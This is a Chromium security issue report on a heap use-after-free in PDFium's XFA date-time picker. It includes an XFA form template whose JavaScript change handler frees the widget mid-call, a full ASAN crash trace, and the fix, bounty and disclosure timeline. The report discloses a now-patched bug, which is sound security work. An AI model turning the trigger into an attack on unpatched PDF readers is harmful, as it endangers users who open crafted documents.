# Security: PDFium heap-use-after-free in CFWL_DateTimePicker::SetEditText (XFA)

| Field | Value |
|-------|-------|
| **Issue ID** | [40051543](https://issues.chromium.org/issues/40051543) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | my...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2020-02-18 |
| **Bounty** | $7,500.00 |

## Description

PDFium heap-use-after-free in CFWL\_DateTimePicker::SetEditText (XFA)

**VULNERABILITY DETAILS**  

The bug is in function CFWL\_DateTimePicker::SetEditText()

```
void CFWL_DateTimePicker::SetEditText(const WideString& wsText) {  
  if (!m_pEdit)  
    return;  
  
  m_pEdit->SetText(wsText);     => trigger JS function in 'change' event  
  RepaintRect(m_rtClient);      => |this| object is used to access |m_pWidgetMgr| in this function  
                                => but |this| object is freed in JS function  
  
  CFWL_Event ev(CFWL_Event::Type::EditChanged);  
  DispatchEvent(&ev);  
}  

```

We can trigger JS callback when function `CFWL_Edit::SetText()` is called. I create a `dateTimeEdit` field, name `f2`.  

Next, I create a 'initialize' event with command `this.rawValue = "2020" + "-" + "12" + "-" + "10"` to trigger to the  

vulnerable path. Last is a 'change' event, the main JS function will trigger deletion of object.

The xml template of this field will be like below:

```
<field name="f2" h="10mm" w="10mm" x="1mm" y="1mm">  
  <ui>  
    <dateTimeEdit/>  
  </ui>  
  <value>  
    <date/>  
  </value>  
  <format>  
    <picture>date{MM/DD/YY}</picture>  
  </format>  
  <event activity="initialize">  
    <script contentType="application/x-javascript">  
      this.rawValue = "2020" + "-" + "12" + "-" + "10";  
    </script>  
  </event>  
  <event activity="change">  
    <script contentType="application/x-javascript">  
      a = a + 1;  
      if (a == 2)   
      {  
        xfa.event.cancelAction = true;  
        c = xfa.resolveNode("xfa.form..f1");  
        xfa.host.setFocus(c);  
        d = xfa.resolveNode("xfa.form..f4");  
        d.instanceManager.addInstance(1);  
        d.instanceManager.removeInstance(0);  
        xfa.host.openList(c);   
      }  
    </script>  
  </event>  
</field>  

```

This JS code in 'change' event will be executed when command `m_pEdit->SetText(wsText);` is executed. In JS function,  

I manage to free CFWL\_DateTimePicker object using XFA JS api function. After JS function, it backs to C++ function  

`CFWL_DateTimePicker::SetEditText()`, object CFWL\_DateTimePicker now is freed, but will be used again to access to  

|m\_pWidgetMgr| of object CFWL\_DateTimePicker in function `CFWL_DateTimePicker::RepaintRect()`.  

==> lead to ASAN heap-use-after-free crash

**VERSION**  

Built from 65e3610864015150153a5b808977d378e726b315  

With `pdf_enable_xfa = true`

**REPRODUCTION CASE**  

Run `pdfium_test.exe` with input file `test.pdf`

ASAN OUTPUT  

==15092==ERROR: AddressSanitizer: heap-use-after-free on address 0x11de5fa005a8 at pc 0x7ff78858a237 bp 0x0013bc4fdab0 sp 0x0013bc4fdaf8  

READ of size 8 at 0x11de5fa005a8 thread T0  

#0 0x7ff78858a236 in CFWL\_Widget::RepaintRect C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fwl\cfwl\_widget.cpp:310  

#1 0x7ff788559afc in CFWL\_DateTimePicker::SetEditText C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fwl\cfwl\_datetimepicker.cpp:166  

#2 0x7ff78849d772 in CXFA\_FFDateTimeEdit::UpdateFWLData C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdatetimeedit.cpp:164  

#3 0x7ff7884cf597 in CXFA\_FFTextEdit::OnSetFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_fftextedit.cpp:172  

#4 0x7ff7884a5ed9 in CXFA\_FFDocView::SetFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:315  

#5 0x7ff7884a3980 in CXFA\_FFDocView::SetFocusNode C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:333  

#6 0x7ff7861b2bb9 in CJX\_HostPseudoModel::setFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_hostpseudomodel.cpp:447  

#7 0x7ff7861aec65 in CJX\_HostPseudoModel::setFocus\_static C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_hostpseudomodel.h:39  

#8 0x7ff7861c4456 in CJX\_Object::RunMethod C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_object.cpp:177  

#9 0x7ff78614195a in CFXJSE\_Engine::NormalMethodCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_engine.cpp:483  

#10 0x7ff78613bc67 in `anonymous namespace'::DynPropGetterAdapter_MethodCallback C:\Users\minhtt\Desktop\chromium\pdfium_newest\pdfium\fxjs\xfa\cfxjse_class.cpp:112 #11 0x7ff786305f4f in v8::internal::FunctionCallbackArguments::Call C:\Users\minhtt\Desktop\chromium\pdfium_newest\pdfium\v8\src\api\api-arguments-inl.h:158 #12 0x7ff786302f6e in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:111  

#13 0x7ff786300610 in v8::internal::Builtin\_Impl\_HandleApiCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:141  

#14 0x7ff7862ff8ae in v8::internal::Builtin\_HandleApiCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:129  

#15 0x7ff7882ec4db in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit+0x3b (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14297c4db)  

#16 0x7ff78827adea in Builtins\_InterpreterEntryTrampoline+0xca (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290adea)  

#17 0x7ff78827443e in Builtins\_ArgumentsAdaptorTrampoline+0xbe (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290443e)  

#18 0x7ff78827adea in Builtins\_InterpreterEntryTrampoline+0xca (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290adea)  

#19 0x7ff78827443e in Builtins\_ArgumentsAdaptorTrampoline+0xbe (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290443e)  

#20 0x7ff78827883d in Builtins\_JSEntryTrampoline+0x5d (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290883d)  

#21 0x7ff78827842b in Builtins\_JSEntry+0xcb (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290842b)  

#22 0x7ff7866089f6 in v8::internal::`anonymous namespace'::Invoke C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\execution\execution.cc:271  

#23 0x7ff786607b6d in v8::internal::Execution::Call C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\execution\execution.cc:365  

#24 0x7ff78621d72c in v8::Function::Call C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\api\api.cc:4926  

#25 0x7ff78613e511 in CFXJSE\_Context::ExecuteScript C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_context.cpp:301  

#26 0x7ff786144b98 in CFXJSE\_Engine::RunScript C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_engine.cpp:153  

#27 0x7ff7886433cd in CXFA\_Node::ExecuteBoolScript C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\parser\cxfa\_node.cpp:2745  

#28 0x7ff78863e08b in CXFA\_Node::ProcessEventInternal C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\parser\cxfa\_node.cpp:2409  

#29 0x7ff78863d6d5 in CXFA\_Node::ProcessEvent C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\parser\cxfa\_node.cpp:2386  

#30 0x7ff7884a2abc in CXFA\_FFDocView::ExecEventActivityByDeepFirst C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:428  

#31 0x7ff7884a2992 in CXFA\_FFDocView::ExecEventActivityByDeepFirst C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:415  

#32 0x7ff7884a31d7 in CXFA\_FFDocView::StopLayout C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:130  

#33 0x7ff78869bfc8 in CPDFXFA\_Context::LoadXFADoc C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fpdfsdk\fpdfxfa\cpdfxfa\_context.cpp:170  

#34 0x7ff7859f8a21 in FPDF\_LoadXFA C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fpdfsdk\fpdf\_view.cpp:205  

#35 0x7ff785977b45 in main C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\samples\pdfium\_test.cc:1172  

#36 0x7ff788b9e377 in \_\_scrt\_common\_main\_seh f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl:283  

#37 0x7ff8a2c07973 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017973)  

#38 0x7ff8a588a270 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006a270)

0x11de5fa005a8 is located 40 bytes inside of 160-byte region [0x11de5fa00580,0x11de5fa00620)  

freed by thread T0 here:  

#0 0x7ff788738df4 in free C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:82  

#1 0x7ff78855bf13 in CFWL\_DateTimePicker::~CFWL\_DateTimePicker C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fwl\cfwl\_datetimepicker.cpp:52  

#2 0x7ff7884a954d in CXFA\_FFField::~CXFA\_FFField C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_fffield.cpp:42  

#3 0x7ff78849e9c3 in CXFA\_FFDateTimeEdit::~CXFA\_FFDateTimeEdit C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdatetimeedit.cpp:27  

#4 0x7ff7885a2f84 in CXFA\_ContentLayoutItem::~CXFA\_ContentLayoutItem C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\layout\cxfa\_contentlayoutitem.cpp:29  

#5 0x7ff7885a3883 in CXFA\_ContentLayoutItem::~CXFA\_ContentLayoutItem C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\layout\cxfa\_contentlayoutitem.cpp:24  

#6 0x7ff788563210 in CFWL\_Edit::OnTextWillChange C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fwl\cfwl\_edit.cpp:306  

#7 0x7ff788511087 in CFDE\_TextEditEngine::Insert C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fde\cfde\_texteditengine.cpp:269  

#8 0x7ff788559ae5 in CFWL\_DateTimePicker::SetEditText C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fwl\cfwl\_datetimepicker.cpp:165  

#9 0x7ff78849d772 in CXFA\_FFDateTimeEdit::UpdateFWLData C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdatetimeedit.cpp:164  

#10 0x7ff7884cf597 in CXFA\_FFTextEdit::OnSetFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_fftextedit.cpp:172  

#11 0x7ff7884a5ed9 in CXFA\_FFDocView::SetFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:315  

#12 0x7ff7884a3980 in CXFA\_FFDocView::SetFocusNode C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:333  

#13 0x7ff7861b2bb9 in CJX\_HostPseudoModel::setFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_hostpseudomodel.cpp:447  

#14 0x7ff7861aec65 in CJX\_HostPseudoModel::setFocus\_static C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_hostpseudomodel.h:39  

#15 0x7ff7861c4456 in CJX\_Object::RunMethod C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_object.cpp:177  

#16 0x7ff78614195a in CFXJSE\_Engine::NormalMethodCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_engine.cpp:483  

#17 0x7ff78613bc67 in `anonymous namespace'::DynPropGetterAdapter_MethodCallback C:\Users\minhtt\Desktop\chromium\pdfium_newest\pdfium\fxjs\xfa\cfxjse_class.cpp:112 #18 0x7ff786305f4f in v8::internal::FunctionCallbackArguments::Call C:\Users\minhtt\Desktop\chromium\pdfium_newest\pdfium\v8\src\api\api-arguments-inl.h:158 #19 0x7ff786302f6e in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:111  

#20 0x7ff786300610 in v8::internal::Builtin\_Impl\_HandleApiCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:141  

#21 0x7ff7862ff8ae in v8::internal::Builtin\_HandleApiCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:129  

#22 0x7ff7882ec4db in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit+0x3b (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14297c4db)  

#23 0x7ff78827adea in Builtins\_InterpreterEntryTrampoline+0xca (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290adea)  

#24 0x7ff78827443e in Builtins\_ArgumentsAdaptorTrampoline+0xbe (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290443e)  

#25 0x7ff78827adea in Builtins\_InterpreterEntryTrampoline+0xca (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290adea)  

#26 0x7ff78827443e in Builtins\_ArgumentsAdaptorTrampoline+0xbe (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290443e)  

#27 0x7ff78827883d in Builtins\_JSEntryTrampoline+0x5d (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290883d)  

#28 0x7ff78827842b in Builtins\_JSEntry+0xcb (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290842b)

previously allocated by thread T0 here:  

#0 0x7ff788738ee4 in malloc C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:98  

#1 0x7ff788b9cc96 in operator new f:\dd\vctools\crt\vcstartup\src\heap\new\_scalar.cpp:35  

#2 0x7ff78849c944 in CXFA\_FFDateTimeEdit::LoadWidget C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdatetimeedit.cpp:46  

#3 0x7ff7884a5e7a in CXFA\_FFDocView::SetFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:314  

#4 0x7ff7884a3980 in CXFA\_FFDocView::SetFocusNode C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\cxfa\_ffdocview.cpp:333  

#5 0x7ff7861b2bb9 in CJX\_HostPseudoModel::setFocus C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_hostpseudomodel.cpp:447  

#6 0x7ff7861aec65 in CJX\_HostPseudoModel::setFocus\_static C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_hostpseudomodel.h:39  

#7 0x7ff7861c4456 in CJX\_Object::RunMethod C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cjx\_object.cpp:177  

#8 0x7ff78614195a in CFXJSE\_Engine::NormalMethodCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_engine.cpp:483  

#9 0x7ff78613bc67 in `anonymous namespace'::DynPropGetterAdapter_MethodCallback C:\Users\minhtt\Desktop\chromium\pdfium_newest\pdfium\fxjs\xfa\cfxjse_class.cpp:112 #10 0x7ff786305f4f in v8::internal::FunctionCallbackArguments::Call C:\Users\minhtt\Desktop\chromium\pdfium_newest\pdfium\v8\src\api\api-arguments-inl.h:158 #11 0x7ff786302f6e in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:111  

#12 0x7ff786300610 in v8::internal::Builtin\_Impl\_HandleApiCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:141  

#13 0x7ff7862ff8ae in v8::internal::Builtin\_HandleApiCall C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\builtins\builtins-api.cc:129  

#14 0x7ff7882ec4db in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit+0x3b (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14297c4db)  

#15 0x7ff78827adea in Builtins\_InterpreterEntryTrampoline+0xca (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290adea)  

#16 0x7ff78827443e in Builtins\_ArgumentsAdaptorTrampoline+0xbe (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290443e)  

#17 0x7ff78827adea in Builtins\_InterpreterEntryTrampoline+0xca (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290adea)  

#18 0x7ff78827443e in Builtins\_ArgumentsAdaptorTrampoline+0xbe (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290443e)  

#19 0x7ff78827883d in Builtins\_JSEntryTrampoline+0x5d (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290883d)  

#20 0x7ff78827842b in Builtins\_JSEntry+0xcb (C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\out\Debug\pdfium\_test.exe+0x14290842b)  

#21 0x7ff7866089f6 in v8::internal::`anonymous namespace'::Invoke C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\execution\execution.cc:271  

#22 0x7ff786607b6d in v8::internal::Execution::Call C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\execution\execution.cc:365  

#23 0x7ff78621d72c in v8::Function::Call C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\v8\src\api\api.cc:4926  

#24 0x7ff78613e511 in CFXJSE\_Context::ExecuteScript C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_context.cpp:301  

#25 0x7ff786144b98 in CFXJSE\_Engine::RunScript C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\fxjs\xfa\cfxjse\_engine.cpp:153  

#26 0x7ff7886433cd in CXFA\_Node::ExecuteBoolScript C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\parser\cxfa\_node.cpp:2745  

#27 0x7ff78863e08b in CXFA\_Node::ProcessEventInternal C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\parser\cxfa\_node.cpp:2409  

#28 0x7ff78863d6d5 in CXFA\_Node::ProcessEvent C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fxfa\parser\cxfa\_node.cpp:2386

SUMMARY: AddressSanitizer: heap-use-after-free C:\Users\minhtt\Desktop\chromium\pdfium\_newest\pdfium\xfa\fwl\cfwl\_widget.cpp:310 in CFWL\_Widget::RepaintRect  

Shadow bytes around the buggy address:  

0x03fe2b940060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa  

0x03fe2b940070: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x03fe2b940080: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa  

0x03fe2b940090: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

0x03fe2b9400a0: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa  

=>0x03fe2b9400b0: fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd  

0x03fe2b9400c0: fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00  

0x03fe2b9400d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x03fe2b9400e0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x03fe2b9400f0: 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fa  

0x03fe2b940100: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==15092==ABORTING

## Attachments

- [test.pdf](attachments/test.pdf) (application/pdf, 7.0 KB)

## Timeline

### cl...@chromium.org (2020-02-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5715122279481344.

### aj...@google.com (2020-02-18)

Not confirmed but assigning to tsepez@. Have prodded CF.

[Monorail components: Internals>Plugins>PDF]

### cl...@chromium.org (2020-02-18)

Testcase 5715122279481344 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5715122279481344.

### rs...@chromium.org (2020-02-18)

Setting to None based on requiring XFA to be enabled.

### [Deleted User] (2020-02-19)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-19)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e

commit d15d718e8d5e8d664454625f2b0c51ed71a2b10e
Author: Tom Sepez <tsepez@chromium.org>
Date: Wed Feb 19 22:12:51 2020

Protect owning layout item in all UpdateFWLData() overrides.

Also observe |this| in CFWL_DateTimePicker::SetEditText() and
ProcessSelChanged().

Bug: chromium:1053617,chromium:1052786,chromium:1040329
Change-Id: Icb4afcd7e5432787668355102b3b36faf5572894
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/66630
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e/xfa/fxfa/cxfa_fflistbox.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e/xfa/fxfa/cxfa_ffcheckbutton.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e/xfa/fwl/cfwl_datetimepicker.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e/xfa/fxfa/cxfa_fftextedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e/xfa/fxfa/cxfa_ffdatetimeedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/d15d718e8d5e8d664454625f2b0c51ed71a2b10e/xfa/fxfa/cxfa_ffcombobox.cpp


### ts...@chromium.org (2020-02-19)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/eca24f9ecc907c4bfd7a4a2ce36b4ac863155066

commit eca24f9ecc907c4bfd7a4a2ce36b4ac863155066
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Feb 20 00:35:24 2020

Roll src/third_party/pdfium 1217cd17daba..d15d718e8d5e (5 commits)

https://pdfium.googlesource.com/pdfium.git/+log/1217cd17daba..d15d718e8d5e

git log 1217cd17daba..d15d718e8d5e --date=short --first-parent --format='%ad %ae %s'
2020-02-19 tsepez@chromium.org Protect owning layout item in all UpdateFWLData() overrides.
2020-02-19 nigi@chromium.org Roll third_party/binutils/ 01aa7745b..ffd1fdb90 (1 commit)
2020-02-19 nigi@chromium.org Roll tools/memory/ f7b00daf4..89552acb6 (1 commit)
2020-02-19 nigi@chromium.org Roll third_party/instrumented_libraries/ 4dca59c6a..bb3f1802c (1 commit)
2020-02-19 tsepez@chromium.org Pass spans to UTF8Decode() in cfx_seekablestreamproxy.cpp

Created with:
  gclient setdep -r src/third_party/pdfium@d15d718e8d5e

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/pdfium-autoroll
Please CC pdfium-deps-rolls@chromium.org on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

Bug: chromium:1040329,chromium:1052786,chromium:1053617
Tbr: pdfium-deps-rolls@chromium.org
Change-Id: I38b0499a67c4f681302621455ddd7dca9011c4ea
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2065391
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#742885}

[modify] https://crrev.com/eca24f9ecc907c4bfd7a4a2ce36b4ac863155066/DEPS


### [Deleted User] (2020-02-20)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-24)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-02-27)

Congrats the Panel decided to award $7,500 for this report!

### na...@google.com (2020-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-05-28)

This issue was migrated from crbug.com/chromium/1053617?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051543)*
